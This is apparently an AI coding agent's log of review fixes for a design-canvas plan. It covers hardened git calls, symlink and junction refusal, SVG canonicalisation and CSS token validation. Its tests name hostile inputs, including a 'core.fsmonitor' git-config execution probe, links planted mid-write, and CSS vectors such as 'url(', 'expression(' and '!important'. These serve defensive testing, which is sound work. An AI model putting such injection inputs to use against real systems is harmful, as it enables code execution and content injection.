Line numbers are as of commit `c000caf` (commits `d1e80bb` I1, `c000caf` I5; this section is the
next commit). Phase 3 citations are
to `.claude/worktrees/phase-3/docs/superpowers/plans/2026-09-23-phase-3-git-convergence-parts/`.
The review's own line numbers for task 22 (`:80-86`, `:48-53`) had moved to `:115-125` and
`:48-84` under b01; the fix is at the text, wherever it now sits.

### I1 — the handoff runs only hardened git, asks git for no path, and follows no link

The review's fix, built as written, with three additions where the facts asked for more.

| Finding part | Change | Where |
|---|---|---|
| bare `git -C … ls-files` | its one git call goes through phase 3's `gitx.Exec` (§HGH H1–H5): Class `Read`, Scope `Clone` for a clone, `Project` for the primary checkout (phase 3 `task-02.md:82-90`), behind a neutral `HandoffGit` port; `*UntrustedConfig` → `409 conflict` with phase 3's `clone_config_untrusted`/`project_config_untrusted` (`ReasonCloneConfigUntrusted`, `ReasonProjectConfigUntrusted`: `task-04.md:117-118` on 2026-09-24; corrected in round 2, RR-I1-1) | `parts/task-22.md:162-190`, `:204-208` |
| named dependency | phase 3 tasks 02–03 are a **hard** dependency for route 24; `Config.HandoffGit` nil → `500 internal` *"phase 3 is not wired"*, never a bare-git fallback | `parts/task-22.md:3`; plan `:420`, `:541-542` |
| `rev-parse --git-path info/exclude` | dropped: the path is `<path>/.git/info/exclude`, computed, only after `Lstat(<path>/.git)` shows a real directory (a gitfile, symlink or reparse point → `409 conflict`, `reason: "handoff_worktree_unsafe"`, no git run); `.git/info` and `exclude` checked through `NoFollow` | `parts/task-22.md:200-204`, `:214-222` |
| `.panacea` symlink redirecting writes | `Materialise` step 4a Lstats `.panacea`, `.panacea/design`, `BundleDir` before any fetch; every step 4a–6 write goes through `NoFollow`, which Lstats **every** component on **every** call (`ModeSymlink`, `ModeIrregular`, Windows `FILE_ATTRIBUTE_REPARSE_POINT`) → `ErrWorktreeUnsafe` → `409 handoff_worktree_unsafe` | `parts/task-22.md:81-86`, `:94-101`, `:104-131`, `:24-25`, `:209-214` |
| tests | the review's three (gitfile `.git`, symlinked `.panacea`, `core.fsmonitor=<marker>`) plus six: every-component guard, Windows junction, link planted mid-write, linked exclude, linked worktree, phase 3 unwired | `parts/task-22.md:258-266`; steps and mutants `:274-285` |
| `Config.Worktrees` | a `worktree.Provider` gives no `Kind` and no hardened git, so route 24 cannot use it; task 22 now adds `Config.HandoffGit` (as task 21 adds `Hub`) and 20a/20b drop `Worktrees` | `parts/task-20.md:248-250`; `parts/task-20b.md:25-28`; plan `:336`, `:361` |

**Additions, declared.** (1) A `linked` worktree is refused (`409`, `reason: "handoff_worktree_linked"`):
its `.git` is a file naming a directory outside the mount, and phase 3's H5 does not pin it
(`task-02.md:465-467`). The old text claimed linked-worktree support through `rev-parse`; that is
withdrawn (`parts/task-22.md:196-200`, `:305-306`). (2) The exclude append writes a sibling temp and
renames it over `exclude`, so an agent's hard link is replaced, not written through (`:217-219`).
(3) If the append is refused after the bundle landed, the bundle this call created is removed, so no
error leaves an unexcluded bundle (`:219-221`).

**Residual, and an owner question.** `NoFollow` checks, then calls; an agent racing a swap between
the two is not excluded. Go 1.24's `os.Root` closes it; the module stays on go 1.23 (program rule).
`NoFollow` is the `FS` seam an `os.Root` FS replaces (`parts/task-22.md:124-128`, `:299-302`).

**Mutants an implementer should expect to survive** (named before, per the program's rule 7):
`NoFollow` testing `ModeSymlink` alone — a junction survives it everywhere but Windows, where only
`TestNoFollow_windowsJunction` runs; and the `primary` row of `TestHandoff_fsmonitorNeverRuns`, if
this git's `ls-files` never invokes `core.fsmonitor` — the part says so and makes the `clone` row
the killer (`:265`).

### I5 — approval captures one artboard per request, each on a measured deadline

| Finding part | Change | Where |
|---|---|---|
| one request, every artboard, 15 s | task 21 step 4: one artboard per request, one after another, each through `RenderWithin(…, ApprovalRenderTimeout)` | `parts/task-21.md:272-284` |
| "the constant cannot simply grow" | `RenderTimeout` stays 15 s for agents; `RenderWithin` refuses any timeout outside `(0, ApprovalRenderTimeout]` | `parts/task-13.md:100-110`, `:124-130` |
| fail naming the artboard | `409 renderer_unavailable` with `details.artboardId`, `artboardName`, `index`, `total`, `renderError`, and a sentence naming it; nothing uploaded before every capture succeeds | `parts/task-21.md:279-284`; tests `:328-330` |
| progress in the toast | `RenderRequest.Progress` (Go and TS), the responder's `onProgress`, the slice's `approvalProgress`, the toast's *"Capturing 3 of 12 · Billing"* (`tabular-nums`, no spinner) | `parts/task-13.md:46-57`; `parts/task-23.md:75-77`; `parts/task-24.md:114-122`, `:150`; `parts/task-27.md:109`, `:117`, `:156`; `parts/task-28.md:19-21`, `:42-46`, `:109` |
| a measured deadline | S8 records per-artboard capture time at 1× and 2× (median, slowest; `captureMs`); `ApprovalRenderTimeout` = `max(30 s, 3 × slowest 2×)`, the report citing the row; over 10 s is a finding, not a bigger constant | `parts/task-01.md:41-47`, `:72`, `:100`, `:113`, `:120-122`, `:142-144`; `parts/task-13.md:104-109` |

**Addition, declared.** The desktop's `approve` used `client.ts`'s 10 s `DEFAULT_TIMEOUT_MS`
(`desktop/src/api/client.ts:33`, verified in the tree), shorter than one approval even before I5.
It is now sent with `timeoutMs: 0`; the server bounds each capture (`parts/task-27.md:50`, test `:156`).
Task 30's hands-on session re-times a twelve-artboard approval in WebView2 (`parts/task-30.md:125-129`),
since S8 times Edge on one machine.

**Hours.** Task 22 +1 h (3), tasks 01 and 21 +0.5 h each (2.5, 3.5): **total 82.5 h**, re-summed
over the 31 rows (plan `:398`, `:419-420`, `:430`). The critical path runs through 21 and 22, so
it grows from ≈ 33 h to ≈ 34.5 h (plan `:432-433`); 01 is off it (24 waits for 23 as well).

**Restatement greps run:** `rev-parse|ls-files|info/exclude|git -C|Worktrees|worktree\.Provider`
over the plan and every part → each hit changed or consistent. `15 s|RenderTimeout|50 per request|every artboard`
→ only agent-facing uses of the 15 s budget remain (`task-13.md:166-169`); P5-H (`plan:212`) is
unchanged, since an approval still covers every artboard.

**Unverified.** Phase 3's names (`gitx.Exec`, `Scope`, `lanes.Catalog`, `project.Worktree.Kind`, the
task-04 reasons) are cited from phase 3's plan parts, not from built code. That Go 1.23's `Lstat`
reports a Windows junction as `ModeIrregular` is from the Go 1.23 release notes, not run here (the
reparse-attribute check covers it if not). That `ls-files` runs `core.fsmonitor`, and every S8 time,
are for the implementer to measure. Nothing was built or run: this batch changes documents only.

## Fix batch b03, round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b03-1.md`)

Paths as in b03 above. Line numbers are as of commit `b2e5f82` (commits `a8ca34c`, the RR-I5 items,
and `b2e5f82`, the RR-I1 items; this section is the next commit). Phase 3 lines were re-read in
`.claude/worktrees/phase-3` on 2026-09-24.

### RR-I5-1 (Important): a stream swap or a lens switch failed the approval and blamed the renderer

The re-review's five fix items, built as written, plus one addition.

| Fix item | Change | Where |
|---|---|---|
| 1. a distinguishable detach, re-sent once | task 13: `ErrNoRenderer`, `ErrRendererDetached`, `ErrRenderTimeout`, each wrapping `ErrRendererUnavailable` (task 11), so existing `errors.Is` callers are unchanged; `detach` fails with `ErrRendererDetached`. Task 21 step 4: a request failing `ErrRendererDetached` is re-sent **once**, with a fresh `ApprovalRenderTimeout`, to the now-preferred renderer; a timeout or `*RenderError` is never re-sent | `parts/task-13.md:112-121`, `:123-125`, `:137-141`; `parts/task-21.md:291-299`; tests `parts/task-13.md:186`, `:189`, `:191`, `parts/task-21.md:358-359` |
| 2. approval requests out of the two-strikes count; queued agent requests stated | a strike is an agent request (`Progress` nil) that times out while its renderer held **no** approval capture at any moment of its life; so neither an approval's own timeout nor an agent request queued behind one is a strike; an answer resets the count. The Service owns the count; task 20's rule restates it | `parts/task-13.md:127-135`; `parts/task-20.md:156-160`; tests `parts/task-13.md:192`, `parts/task-20.md:296` |
| 3. the sentence names the cause | `details.cause` ∈ `no_renderer`, `renderer_gone`, `timeout`, `render_error`, each with its own sentence; *"the lens is open when a human approves"* is deleted | `parts/task-21.md:300-313`; tests `:357`, `:359`, `:364`; the toast shows each unchanged, `parts/task-28.md:114` |
| 4. P5-I extended | *"closing the window … at any point before the last artboard is captured"* drops the approval; the toast's second line says so | plan `:213`; `parts/task-28.md:42-48`, `:114` |
| 5. test rows | `TestApprove_rendererSwapMidApproval` (hidden takes artboard 4 → 201; the same with the window's renderer re-attached on a new stream → 201) and `TestApprove_rendererGoneMidApproval` (no renderer remains → 409 `renderer_gone`; a second detach → the same; a timeout or render error → exactly one request, no re-send) | `parts/task-21.md:358-359` |

**Addition, declared: the desktop keeps a hidden renderer for the canvas under approval.** The fix's
re-send needs a renderer to go to. Without one, leaving the lens (which the global toast invites) still
fails the approval, only now with an honest sentence. Task 27's slice gains `approving` (the canvas id,
set when `designApprove` opens the Undo window and cleared on Undo or when the POST settles).
`selectHiddenRendererCanvases` includes that canvas even while the lens shows it. Two consequences:
the stream swap this causes lands before any capture request, and a lens switch mid-capture re-sends
to a renderer that is already loaded. `Render` still prefers the visible one.
`parts/task-27.md:110-115`, `:143-147`; tests `:177`, `:179`. Task 30's hands-on step walks it
(`parts/task-30.md:129-132`).
*Unverified:* that a hidden renderer's 2× PNG matches the visible one's pixel for pixel. Task 13's
`TestRender_prefersVisible` exists because a hidden renderer may lack the lens's loaded fonts. So an
approval that falls back mid-capture can carry artboards from two renderers. Task 30 compares them.

**Second trigger (the re-review's "unverified").** It is closed by item 2, whatever S8's times turn
out to be: no approval capture, and no agent request queued behind one, can detach the lens.

### RR-I5-2 (Minor): a too-large canvas was refused only after every capture

`handoff.FileCount(doc)` (four per artboard + `tokens.css`, `tokens.json`, `tree.json` + one per
distinct asset + the manifest) is checked against `MaxFiles` in step 4, **before** any render request.
Step 5 keeps the full check as the backstop. The byte limits stay in step 5, because the PNGs are
most of the bytes and do not exist yet. `parts/task-21.md:80-84`, `:278-283`, `:314-316`; tests
`:360` (the renderer fake sees no request) and `:361` (`FileCount` pinned to `BuildSnapshot`'s own
output, a shared asset included).

### RR-I5-3 (Minor): tests hard-coded the constant S8 resets

`TestRenderWithin_ownDeadline` and `TestApprove_failureNamesArtboard` now write every time from
`RenderTimeout` and `ApprovalRenderTimeout`. The "answered late but in time" point is
`RenderTimeout + 5 s`, which stays below `ApprovalRenderTimeout` because that constant is at least
30 s by its own rule. `parts/task-13.md:195`; `parts/task-21.md:363-364`.

### RR-I1-1 (Minor): two phase 3 citations pointed at the wrong text

These are now cited by symbol, plus the line the symbol stood on 2026-09-24 (re-read in phase 3's tree):
`lanes.Catalog` `task-03.md:301-316`, `gitx.Machine` `task-02.md:200-210`, `gitReady`
`task-04.md:129-132`, `ReasonCloneConfigUntrusted`/`ReasonProjectConfigUntrusted` `task-04.md:117-118`.
The fixes are at `parts/task-22.md:197-203` and `:235-236`, and in this review's b03 table (the `bare git -C … ls-files` row).
Checked unchanged: `task-02.md:342-349` (code execution on the host) and `:455-467` (the H5 layout pin).
The exclude-path prose cited `:455-463`; it now cites `:455-467` (`parts/task-22.md:245`).

### RR-I1-2 (Minor): an equivalent mutant

The `rev-parse --git-path` mutant is dropped, with the reason written into the step so no
implementer is stuck on it. The list gains "the exclude append made through the bare `fs`"
(killed by `TestHandoff_excludeLinked`), plus four mutants for this round's own changes (step 4a
creating directories, `NoFollow` Lstatting through `os`, a fixed temp name, `tmp` via `MkdirAll`),
each naming its killer. `parts/task-22.md:315-327`.

### RR-I1-3 (Minor): fixed temp names

Both temps are now **fresh**:
- `tmp` is `BundleDir + ".tmp-" + 16 hex` from `crypto/rand`, made with the new `FS.Mkdir`, which fails
  on an existing path.
- The exclude temp is `exclude.panacea-<16 hex>`, which `Lstat` must show absent.

`parts/task-22.md:91-98`, `:245-251`. Test `TestMaterialise_freshTemps` fixes the `randHex` seam, then
pre-plants a directory holding `extra.html` and a hard link to a worktree file. Both are refused,
nothing is written through them, and two real-seam runs use two names (`:301`). The part now also
states what is **not** claimed: a regular file the agent drops into `tmp` between its creation and the
rename rides into the bundle. From then on the bundle sits in the agent's own read-write worktree, so
"byte-for-byte what was approved" is a claim about what the call writes (`:107-112`). b03's addition (2),
above, is corrected by this: the fixed `exclude.panacea-tmp` name is gone.

### RR-I1-4 (Minor): `FS` had no `Lstat`

- `FS` gains `Lstat` and `Mkdir` (`parts/task-22.md:158-165`).
- `NoFollow` Lstats through `inner`, never the host's `os`, so phase 8's pod `FS` is checked on its own
  filesystem. The Windows reparse check reads `Sys()` only when it is a
  `*syscall.Win32FileAttributeData` (`:127-138`).
- Step 4a now only checks (`:81-88`). Step 6 makes the directories after every fetch and removes the
  ones it made on error (`:91-93`).
- Tests: `TestNoFollow_lstatThroughInner` (`:300`), and `TestHandoff_hubDown` extended so that no
  `.panacea/` is left behind (`:299`).

### RR-I1-5 (Minor): the desktop was not told about the `linked` refusal

- Task 27 adds `selectHandoffWorktrees`: a clone first, then the primary, never a linked worktree
  (`parts/task-27.md:149-157`, test `:178`).
- Task 28's *Start a Develop session from this design* uses its first entry. With none, the button is
  disabled with a sentence (`parts/task-28.md:92-95`, test `:115`).
- The kind comes from phase 3 task 06's `Worktree.kind`. This plan does not amend `types.ts`: it is
  gated against UI contract §2, and phase 3 owns that amendment (`task-06.md:23`, `:42`, `:52`, checked).
  Until then it goes through one seam function, `handoffKind`, which returns `isPrimary ? "primary" :
  "linked"`. That is exact before phase 3, when every non-primary worktree is a `git worktree add`
  checkout. Seam S5-P3.3 is at plan `:471`.

### RR-I1-6 (Minor): whether task 22 can ship before phase 3

- Task 22 lands in two halves. Half A has no phase 3 import: the bundle, `NoFollow`, the port, the
  routes and every recording-fake test. Route 24 answers *"phase 3 is not wired"* until Half B.
- Half B lands with phase 3 tasks 02–03: `handoffgit_phase3.go`, the `design.go` line and
  `TestHandoff_fsmonitorNeverRuns`. `TestHandoff_gitfile` moves to Half A, because it refuses before
  any git runs. Step 3's claim that it needs the real `Exec` is corrected.
- The constructor is written out against phase 3's signatures as they stand: `MachineHardening(ctx,
  root) (Hardening, error)` `task-02.md:103`, `NewExec(h) (*Exec, error)` `:147`, `Local{Runner, Root}`
  `:213-216`.
- Where: `parts/task-22.md:3`, `:328-362`, the test row `:297`; plan `:420`.

### Mutants expected to survive (named first, per rule 7)

These are for the implementer to run; nothing was run here:
- A strike counter that skips only `Progress`-set requests, ignoring "queued behind an approval". Only
  `TestRender_strikesSkipApproval`'s third renderer kills it.
- A `FileCount` that counts assets per artboard rather than distinct. Only `TestFileCount_matchesBuild`'s
  shared-asset fixture kills it.

### Not done, and why

- **Hours were not re-estimated.** This round adds work to tasks 13 (sentinels and the strike rule),
  21 (re-send, causes, `FileCount`), 22 (`Lstat`/`Mkdir`, fresh temps, the halves) and 27 (`approving`,
  the selector). By my estimate that is 1.5 to 2 h in total, unmeasured. The 82.5 h total and the 34.5 h
  critical path (plan `:430-433`) are unchanged, so they are now a low estimate. Re-deriving the path
  is left to the orchestrator's sizing pass.

**Restatement greps run** over the plan, every part and this review, for:
`panacea-tmp|task-03\.md:279|task-04\.md:83|NewExec\(MachineHardening|rev-parse --git-path. through|MkdirAll, WriteFile, ReadFile, Rename and RemoveAll|is then created|two timeouts|at 30 s|renderer failed on that`.
Each hit was changed. The one that remains is the b03 section's own history of addition (2), and this
section corrects it.

**Unverified.** Every citation to phase 3 is to its plan parts, not to built code. The hidden
renderer's PNG parity is unverified, as stated above. Nothing was built or run: this round changes
documents only.

## Fix batch b04 (2026-09-24) — I4, I8, I2

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Line numbers are as of this section's commit (commits `3ec956b` I4, `ad1b966` I8, `3819dbc` I2, then
this one, which also widens three test rows without moving a line). The review's line numbers had
moved under b01–b03: P5-Q is plan `:221`, not `:212`; G10 is `:294-298`, not `:281-283`; task 07's
`SanitiseSVG` sat at `:277-279` and `TokenValue` at `:289`. Each fix is at the text, wherever it sat.

### I4 — the hidden renderer keeps rendering while the window is minimised

The review's fix, as written, plus a flush for a rAF stranded by the switch to hidden.

| Finding part | Change | Where |
|---|---|---|
| rAF-only render queue | `schedulePatch`: `requestAnimationFrame` while `document.visibilityState === "visible"`, `queueMicrotask` otherwise; one callback per pending version; no `setInterval`, no `setTimeout` (G10) | `parts/task-24.md:74-94` |
| a rAF queued just before minimise never fires | a `visibilitychange` listener per view (removed in `dispose`) flushes a pending patch at once. **Addition**: without it, a patch queued while visible is stranded when the window then hides | `parts/task-24.md:91-93` |
| responder reads stale views | `view.sync()` on every view it reads before it measures or captures; a past-revision load syncs its off-screen frames too | `parts/task-24.md:130-135` |
| responder test, `visibilityState` stubbed `"hidden"` | `responder.test.ts › hiddenHead`: `computed`, `layout` and `screenshot` at head, rAF stubbed never to fire; plus `patch.test.ts › hiddenUsesMicrotask`, `› turnsHidden`, `› noTimer` | `parts/task-24.md:172-176` |
| spike check S11 | minimise Edge through CDP (`Browser.getWindowForTarget`, `Browser.setWindowBounds` `windowState: "minimized"`), send `__renderRequest(160)` through the page's copy of `schedulePatch`, record `visibilityState`, whether a probe rAF fired, the measured width and whether capture resolved; a negative with rAF-only scheduling; a decision-table row; the ten-check counts become eleven | `parts/task-01.md:16`, `:36`, `:61`, `:75`, `:87`, `:91-94`, `:101-106`, `:121`, `:129-143` |
| restatements | G10; P5-Q; the task 01 row; the WebView2 unverified list; task 30's hands-on item 1 (S1–S11, and a minimised `get_screenshot` in the Tauri shell) | plan `:221`, `:294-298`, `:401`, `:526-528`; `parts/task-30.md:117-120` |

**Unverified**, as the review said: whether a minimised WebView2 window reports itself hidden. S11
measures Edge; task 30's hands-on item measures the shell. If S11 fails (layout or capture itself
stops while minimised), task 24 still builds as planned, and the report goes to the orchestrator as a
finding: either the shell keeps the webview unthrottled (a WebView2/Tauri setting, *unverified* which)
or `renderer-unavailable` tells the user to restore the window. That is an owner-visible choice, not
a tuning (`parts/task-01.md:121`).

### I8 — SVG nodes are namespaced, well-formed, and carry per-node ids

The review's fix, with one change to its mechanism. The prefix depends on the node id, so any path
that copies an svg node under a new id has to re-prefix. There are three such paths: `x-clone`,
`duplicate_nodes` and the desktop's Alt-drag duplicate, which sends client-minted ids (`parts/task-25.md:66-69`).
So the authority canonicalises instead of only checking: `Checker.SVG(nodeID, markup)` returns the
canonical form and `Apply` stores it. The re-prefix then happens in one Go function, not in each
client. Content the sanitiser would drop is still refused, never repaired.

| Finding part | Change | Where |
|---|---|---|
| root `xmlns` | always written as `SVGNamespace` on the root, whatever the input had; never on a child | `parts/task-07.md:287-293`, `:317` |
| well-formed XML | attribute values escape `& < "`, text escapes `& < >`, XML-forbidden characters removed, empty elements `<x/>`. **Addition**: SVG case restored (`linearGradient`, `clipPath`, `viewBox`, `gradientUnits`); x/net/html lowercases them and adjusts in foreign content, verified in the module cache at `golang.org/x/net@v0.26.0/html/foreign.go:126`, `:153`, `:175`, `:197`, `:217` | `parts/task-07.md:294-301` |
| ids collide across svg nodes | every kept id becomes `<nodeID>-<local>`; any leading `n-<12 hex>-` is stripped first, so the rewrite is idempotent and re-prefixes rather than stacks; `url(#…)` rewritten to match. **Addition**: a `url(#x)` naming no id in the same SVG, or an id outside `^[A-Za-z_][A-Za-z0-9_.-]{0,63}$`, is dropped, so no reference reaches another node. `nodeID ""` is for SVG assets, which render in their own image document | `parts/task-07.md:302-317`; the parse table `:106`, `:107` (the `img` and `svg` rows at `6b20704`; was `:104`, corrected in round 2, re-review RR-M6) |
| the authority | `doc.Checker.SVG(nodeID, markup) (canonical, error)`; `Apply` stores the return and writes it into the recorded op, so replicas and replay apply the same bytes. **Security addition**: `set_props` could set `SVG` (`task-06.md:33`), but its refusal row never ran `Checker.SVG`, so markup no sanitiser saw could be stored. It runs now | `parts/task-06.md:86-91`, `:171-172`, `:218`; `parts/task-07.md:368-374`; `parts/task-10.md:132-136` |
| tests: `namespaceURI` in `svgWalk`; distinct ids across two svg nodes | Go: `TestSVG_namespace`, `_case`, `_wellFormed`, `_idsPerNode` (every url-bearing attribute), `_danglingRef`, `TestParse_twoSVGs`, `TestChecker_SVG`, `TestApply_svgCanonical`. TS: `svgWalk` asserts `namespaceURI`; `svgNoNamespace` (no `xmlns`, or a `parsererror`, builds nothing); `svgIdsDistinct` (the same literals as the Go test) | `parts/task-07.md:411-418`; `parts/task-06.md:218`; `parts/task-24.md:163-165` |
| restatements | P5-F; `Node.SVG`; export "verbatim" and its round trip "ids aside"; `upload_asset`; `duplicate_nodes`; the desktop duplicate | plan `:210`; `parts/task-05.md:83`; `parts/task-08.md:40-47`; `parts/task-16.md:76`, `:79`; `parts/task-25.md:66-69` |

### I2 — token values get the declaration refusals, and every writer re-checks them

The review's fix, with one deviation and two additions. **Deviation, declared:** the review says "a
`url()` must be an `asset:` ref". Instead, a token value refuses **any** `url()`. None of the ten
token types takes an image. Allowing `asset:` refs would also need the asset-ref rewrite in three
places that have none today: ExportHTML's `<style>`, `tokens.css` and the renderer's `setProperty`
(the iframe CSP blocks `asset:`). That is more surface for a value no type accepts.

| Finding part | Change | Where |
|---|---|---|
| `TokenValue` checks only the type | four steps, in order. (1) The "Inline CSS" global refusals, through the same tokenizer. (2) Plus `;`, `!`, a comment, an unterminated string or bad-url, and any control character. (3) Plus any `url()`. (4) Then the type, by a new `TokenRules` map. **Addition**: `font-family` becomes `RuleFamilyList` (a comma list of strings or identifiers), not the "any" rule the review's payload rode; `line-height` gets `RuleNumberOrLength`. `ErrUnsafeToken` lives in `dialect`, so neither writer package imports the other | `parts/task-07.md:134-136` (the "Inline CSS" section says so), `:328-367`; `allowlist.json` `tokenRules` `:388` |
| `allowlist.ts` re-check before `setProperty` | `allowedTokenValue(type, value)`: the same four steps from `allowlist.json`; the renderer sets a token only if it passes, and counts `refusedTokens` | `parts/task-23.md:168-175`; `parts/task-24.md:14-15`, `:46-49`, `:68`, test `:166` |
| `TestTokenValue` refuses the two review values | `TestTokenValue_refusals` over `testdata/token-vectors.jsonl`: the two values under **every** type, plus `URL(`/`Url(` (case-insensitive function names), `;`, `!important`, `url(asset:…)`, `/*`, an unterminated string, a CSS escape, `expression(`, a newline, and `attr()`/`var()` in a family list. The same file drives the TS test, so Go and TS refuse one set | `parts/task-07.md:26-28`, `:420-421`; `parts/task-23.md:190` |
| the export test's fixture | `TestExportHTML_hostileToken` builds the document through `Apply` with a permissive `Checker`, as `store.Replay` does (`parts/task-10.md:132-136`), and expects `ErrUnsafeToken` for each review value. **Addition**: ExportHTML, `tokens.CSS` and `tokens.DTCG` each re-check every token before writing, because a replayed or on-disk document never passed `Apply`'s checker. `CSS` now returns `(string, error)`; `get_tokens` answers `invalid` on that error | `parts/task-08.md:62-72`, `:157`; `parts/task-09.md:125-136`, `:169`; `parts/task-17.md:47` |
| restatements | `Token.Value`'s comment (it cited a `dialect.CheckTokenValue` that does not exist); `doc.Checker.TokenValue`'s comment | `parts/task-05.md:119`; `parts/task-06.md:85` |

**Observed, not fixed (outside this batch).** Task 23's `allowedStyle` (`parts/task-23.md:164-167`)
does not refuse a function missing from `Functions`, which the Go declaration check does
(`parts/task-07.md:131-132`). `allowedTokenValue` does refuse it. Whether `allowedStyle` should match is
for the orchestrator's next batch. It is a renderer-side defence-in-depth gap, not a way past the
authority.

### Mutants an implementer should expect to survive (named before, per rule 7)

1. **I4**: a responder that calls `sync()` only for `screenshot`. It survives any test that asks
   only for a screenshot. `hiddenHead` now asks for `computed`, `layout` and `screenshot`
   (`parts/task-24.md:176`).
2. **I8**: `url(#…)` rewritten only in `fill`. `TestSVG_idsPerNode` now carries `stroke`,
   `clip-path` and `mask` too (`parts/task-07.md:415`).
3. **I2**: step 3 matching `url(` case-sensitively. The `URL(` and `Url(` vectors kill it
   (`parts/task-07.md:421`).

**Owner decisions.** None new. The S11 "fail" branch (keep the webview unthrottled, or tell the user
to restore the window) becomes an owner question only if S11 fails.

**Hours** not re-estimated. The additions are about 45 minutes across tasks 01, 07, 08, 09, 23 and
24; the task table still shows the old figures.

**Restatement greps run** over the plan and every part, for:
`requestAnimationFrame|rAF|visibilityState|ten checks|S1–S10|SanitiseSVG|Checker.SVG|SVG\(markup|canonical sanitised|TokenValue|CheckTokenValue|tokens.CSS|ExportHTML\(|setProperty`.
Each hit was changed, or already agreed. The hits left are in phase 2's plan parts, which are
another stream's and out of scope (`phase-2-parts/task-19.md`, visibility polling).

**Unverified.** Nothing was built or run: this batch changes documents only. Checked against the
real tree: x/net v0.26.0's SVG case tables are in the module cache (above). Whether jsdom's
`DOMParser("image/svg+xml")` sets `namespaceURI` and yields a `parsererror` document the way
Chromium does is not checked, and `svgNoNamespace` depends on it. So is how a minimised WebView2
window behaves (S11 measures Edge only).

## Fix batch b04, round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b04-1.md`)

Commits `396f6d2` (RR-I8-1, RR-I2-1), `b304f4f` (RR-I4-1, RR-M4), `8e85bba` (RR-M1, RR-M2, RR-M3,
RR-M5), and this section's commit (RR-M6, S11's field rename). Paths are relative to
`docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`. Lines are as of
this section's commit.

| Finding | Change | Where |
|---|---|---|
| RR-I8-1 defs-last SVG loses its refs | the `url(#…)` check is two passes: collect every kept id, then rewrite and check refs; Figma's defs-last order named as the reason | `parts/task-07.md:324-330` (Go), `parts/task-24.md:63-66` (TS walk) |
| RR-I8-1 tests | a defs-last row (node `n-000000000004`, `url(#…paint0_linear_1_2)` before its `<defs>`) in `TestSVG_idsPerNode`; `TestParse_twoSVGs` builds both icons defs-last with an empty report; `svgIdsDistinct` gains a fourth node holding the same canonical literal. Each names "one-pass `url(#…)` check" as its mutant | `parts/task-07.md:459`, `:461`; `parts/task-24.md:169` |
| RR-I2-1 Go and TS token rules drift | `RuleLengthOrNormal` and `RuleFontWeight` are their own token-only rules, so the JSON rule name carries the keywords; `RuleNumber`/`RuleLength` gain nothing | `parts/task-07.md:381-395`, `allowlist.json` sample `:431-432`, TS `parts/task-23.md:173-180` |
| RR-I2-1 tests | new shared `testdata/token-accept.jsonl` (bold, 650, `letter-spacing: normal`, `var(--space-2)`, `1.4`, `normal`, the Inter list, …), accepted by `TestTokenValue` and `allowedTokenValue.test.ts`; `opacity: bold` still refused on both sides | `parts/task-07.md:29-34`, `:398-402`, `:464`; `parts/task-23.md:194` |
| RR-I4-1 Playwright's switches | `ignoreDefaultArgs` drops `--disable-background-timer-throttling`, `--disable-backgrounding-occluded-windows`, `--disable-renderer-backgrounding`; the runner records the effective command line and fails if a switch remains | `parts/task-01.md:103-113` |
| RR-I4-1 hidden-state race | `window.__armHidden()` before minimising; await `visibilitychange` to `"hidden"`, bounded 5 s, record `waitMs`; `not-applicable` only after the wait expires | `parts/task-01.md:78`, `:90`, `:114-116`, `:150-152` |
| RR-I4-1 capture time | S11 answers `hiddenCaptureMs` (renamed from the first draft's `captureMs`, which collided with S8's top-level `captureMs` array); `SpikeResult.s11` carries every S11 value | `parts/task-01.md:48-50`, `:78` |
| RR-M1 export trusts replayed nodes | `ExportHTML` re-checks each svg node (`Checker{}.SVG(id, Node.SVG)` must return the stored bytes) and each declaration (`CheckDeclaration`); new `dialect.ErrUnsafeNode`; `TestExportHTML_hostileNode` | `parts/task-08.md:40-42`, `:73-80`, `:166`; `parts/task-07.md:372-375` |
| RR-M2 `""` and the prefix | `SanitiseSVG("", …)` strips `n-<12 hex>-` too; `SanitiseSVG("", SanitiseSVG(a, m)) == SanitiseSVG("", m)` asserted | `parts/task-07.md:330-335`, `:459` |
| RR-M3 refuse vs canonicalise | stated rule: a spelling change is canonicalised (order, case, a missing root `xmlns`, a child `xmlns` equal to the SVG namespace, escaping, the id prefix); a foreign `xmlns` or a control character is a report entry, so `Checker.SVG` refuses it. One `TestChecker_SVG` row each, and `TestSVG_namespace`/`TestSVG_wellFormed` assert the report entries | `parts/task-07.md:298-302`, `:309-310`, `:409-416`, `:456`, `:458`, `:462` |
| RR-M4 S11 inside Tauri | task 30 runs S1–S10 in the Tauri page; S11 by hand through the product | `parts/task-30.md:117-122` |
| RR-M5 writers' error surfaces | MCP `export` `html` answers `invalid` naming the token or node; the handoff bundle fails whole, and the approve route answers the new `422 design_unsafe` (task 20's thirteenth code, task 27's `ProblemCode` union); `TestApprove_unsafeDocument` | `parts/task-17.md:53`; `parts/task-21.md:78-84`, `:323-325`, `:369`; `parts/task-20.md:203`; `parts/task-27.md:16-18` |
| RR-M6 drifted citation | b04's `:104` corrected to `:106` | this file `:1067` |

**Deviations, declared.**
- RR-M1: of the two options, the re-check was taken. It is the root cause: the same replay threat
  covers SVG and declarations. `HTML` stays a pure writer. MCP `export`'s `HTML(IDs:false)` for a
  non-artboard node is not re-checked. Its output goes to the agent as text, not to a browser, and
  every node it reads was checked by `Apply` or recorded canonical in the log (`parts/task-10.md:133-136`).
- RR-M5: the review suggested `invalid` for the approval. The approve route speaks HTTP problem
  codes (`parts/task-20.md:191-203`), not MCP's `invalid`, so it gets its own code. The desktop's
  `ProblemCode` union and task 27's count ("thirteen") change with it.

**Mutants named for the next implementer**, the two most likely to survive:
1. **A one-pass `url(#…)` check.** Killed by the defs-last rows in Go and TS.
2. **`font-weight` keywords handled inside Go's `TokenValue`**, not in `RuleFontWeight`. Killed by
   `token-accept.jsonl`, since TS reads only the rule name and must accept `bold`.

**Restatement greps run** over the plan and every part, for:
`RuleLength|RuleNumber|tokenRules|token-vectors|twelve|handoff_snapshot_invalid|verbatim|ErrUnsafeToken|S11|S1–S11|not-applicable|stayed visible|captureMs|defs|one-pass`.
Each hit was changed or already agreed.

**Unverified.** Nothing was built or run; this batch changes documents only. Not checked on this
machine:
- Playwright's three default switches, and whether `Browser.getBrowserCommandLine` answers without
  `--enable-automation`. The runner fails loudly if neither route yields the command line.
- Figma's defs-last export order, taken from familiarity with its output.
